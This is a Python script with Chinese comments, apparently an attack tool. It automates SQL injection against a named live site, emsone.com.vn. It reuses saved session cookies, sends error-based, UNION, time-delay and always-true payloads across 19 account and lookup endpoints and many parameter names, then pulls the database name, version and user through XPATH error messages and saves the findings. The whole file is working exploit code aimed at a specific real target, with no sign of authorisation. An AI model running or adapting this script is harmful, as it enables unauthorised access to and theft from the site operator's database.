#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import requests
import urllib.parse
import json
import time
import re
from concurrent.futures import ThreadPoolExecutor, as_completed
import urllib3
urllib3.disable_warnings()

class ComprehensiveSQLi:
    def __init__(self):
        self.base_url = "https://emsone.com.vn"
        self.session = requests.Session()
        self.session.verify = False
        self.load_session()
        self.working_endpoints = []
        self.db_info = {}
        
    def load_session(self):
        try:
            with open('session_cookies.json', 'r') as f:
                cookies = json.load(f)
                self.session.cookies.update(cookies)
        except:
            pass
    
    def test_single_endpoint(self, endpoint, param, payload):
        """测试单个端点payload"""
        url = f"{self.base_url}{endpoint}?{param}={urllib.parse.quote(payload)}"
        try:
            start = time.time()
            r = self.session.get(url, timeout=15)
            elapsed = time.time() - start
            
            has_test = 'TEST' in r.text
            has_xpath = 'XPATH' in r.text.upper()
            has_delay = elapsed > 4
            has_error = 'error' in r.text.lower() or 'sql' in r.text.lower()
            
            if has_test or has_xpath or has_delay or has_error:
                return {
                    'endpoint': endpoint,
                    'param': param,
                    'payload': payload,
                    'has_test': has_test,
                    'has_xpath': has_xpath,
                    'has_delay': has_delay,
                    'elapsed': elapsed,
                    'response': r.text[:500]
                }
        except:
            pass
        return None
    
    def comprehensive_test(self):
        """全面测试"""
        print("[*] 全面SQL注入测试...")
        
        endpoints = [
            '/Account/GetUserInfo',
            '/Account/JLogin',
            '/Account/Logout',
            '/Account/Register',
            '/Account/RegisterView',
            '/Handle/SearchListCustomer',
            '/Handle/SearchListProvince',
            '/Handle/SearchListWardByDistrictID',
            '/Handle/SearchListDistrictByProvinceID',
            '/Handle/SearchListWareHouse',
            '/Handle/SearchListProductVariantByWareHouseID',
            '/Handle/SearchListFunctionalByGroupPermissionID',
            '/Handle/TransportPostageCharged',
            '/Handle/SearchPWDByVMapCode',
            '/Handle/SearchPWDByVNPMapsAutocomplete',
            '/Handle/SearchPWDByVNPMapsSearch',
            '/Handle/SearchPWDByEMSVMapsSearch',
            '/Handle/SearchPWDByEMSMapsSearch',
            '/Handle/VNPMapsAutocomplete',
        ]
        
        params = ['id', 'ID', 'Id', 'user_id', 'userID', 'userId', 'customer_id', 'customerID',
                  'q', 'query', 'search', 'keyword', 'name', 'email', 'mobile', 'phone',
                  'MobileNumber', 'Email', 'Password', 'Type', 'DistrictID', 'ProvinceID',
                  'WareHouseID', 'GroupPermissionID']
        
        payloads = [
            "1' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT 'TEST'), 0x7e))--",
            "1' UNION SELECT 'TEST'--",
            "1' AND SLEEP(5)--",
            "1' OR '1'='1",
        ]
        
        results = []
        with ThreadPoolExecutor(max_workers=20) as executor:
            futures = []
            for endpoint in endpoints:
                for param in params:
                    for payload in payloads:
                        futures.append(executor.submit(self.test_single_endpoint, endpoint, param, payload))
            
            for future in as_completed(futures):
                result = future.result()
                if result:
                    results.append(result)
                    print(f"    [!] {result['endpoint']} [{result['param']}]")
                    if result['has_xpath']:
                        print(f"        [+] XPATH错误")
                        match = re.search(r"XPATH syntax error: '~([^']+)~'", result['response'], re.IGNORECASE)
                        if match:
                            print(f"        [+] 提取值: {match.group(1)}")
                    if result['has_delay']:
                        print(f"        [+] 时间延迟: {result['elapsed']:.2f}s")
        
        return results
    
    def extract_from_working(self, results):
        """从有效结果中提取数据库"""
        print("\n[*] 从有效结果提取数据库...")
        
        for result in results:
            if result['has_xpath']:
                endpoint = result['endpoint']
                param = result['param']
                
                queries = [
                    ('SELECT database()', '数据库名'),
                    ('SELECT version()', '版本'),
                    ('SELECT user()', '用户'),
                ]
                
                for query, label in queries:
                    payload = f"1' AND EXTRACTVALUE(1, CONCAT(0x7e, ({query}), 0x7e))--"
                    url = f"{self.base_url}{endpoint}?{param}={urllib.parse.quote(payload)}"
                    
                    try:
                        r = self.session.get(url, timeout=10)
                        match = re.search(r"XPATH syntax error: '~([^']+)~'", r.text, re.IGNORECASE)
                        if match:
                            value = match.group(1)
                            print(f"    [+] {label}: {value}")
                            self.db_info[label] = value
                    except:
                        pass
    
    def run_all(self):
        """执行所有测试"""
        print("="*60)
        print("全面SQL注入扫描")
        print("="*60)
        
        results = self.comprehensive_test()
        self.extract_from_working(results)
        
        # 保存结果
        with open('comprehensive_sqli_results.json', 'w', encoding='utf-8') as f:
            json.dump({
                'results': results,
                'db_info': self.db_info
            }, f, indent=2, ensure_ascii=False)
        
        print(f"\n[+] 发现 {len(results)} 个有效注入点")
        print(f"[+] 提取数据库信息: {len(self.db_info)} 项")

if __name__ == "__main__":
    scanner = ComprehensiveSQLi()
    scanner.run_all()